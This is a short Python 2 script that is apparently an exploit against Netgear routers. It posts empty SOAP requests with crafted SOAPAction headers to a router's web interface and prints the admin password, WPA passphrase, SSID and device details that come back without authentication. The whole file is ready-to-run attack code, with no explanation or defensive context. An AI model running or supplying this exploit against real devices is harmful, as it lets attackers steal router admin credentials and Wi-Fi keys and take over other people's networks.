#! /usr/bin/python

import requests
from BeautifulSoup import  BeautifulSoup

addr = "192.168.1.1"
port = 80
ssl = False
def get_device_info(text):
    soup = BeautifulSoup(text)
    print '[*] Model Number: ' + soup.find('modelname').text
    print '[*] Serial Number: ' + soup.find('serialnumber').text
    print '[*] Firmware Version: ' + soup.find('firmwareversion').text
def get_wpa_keys(text):
    soup = BeautifulSoup(text)
    print '[*] WLAN WPA Key: ' + soup.find('newwpapassphrase').text
def get_ssid(text):
    soup = BeautifulSoup(text)
    print '[*] WLAN SSID: ' + soup.find('newssid').text
    print '[*] WLAN Enc: ' + soup.find('newbasicencryptionmodes').text
def get_credentials(text):
    soup = BeautifulSoup(text)
    print '[*] Admin Password: ' + soup.find('newpassword').text
actions = [
    {
        'action': 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo',
        'name': 'Extracting credentials...',
        'process': get_credentials
    },
    {
        'action': 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo',
        'name': 'Extracting wifi information...',
        'process': get_ssid
    },
    {
        'action': 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys',
        'name': 'Extracting WPA keys...',
        'process': get_wpa_keys
    },
    {
        'action': 'urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo',
        'name': 'Extracting device info...',
        'process': get_device_info
    }
]

temp_actions = [
    {
        'action': 'urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo',
        'name': 'Extracting device info...',
        'process': get_device_info
    }
]


endpoint = ("https://" if ssl else "http://") + addr + ':' + str(port)
print '[!] Attempting to extract information from %s' % endpoint

for action in actions:
    # print action.get('name')
    res = requests.post(endpoint, data={'':''}, headers={'SOAPAction': action.get('action')})
    if res.status_code == 200:
        action.get('process')(res.text)
    else:
        print 'Failed with status code ' + str(res.status_code)
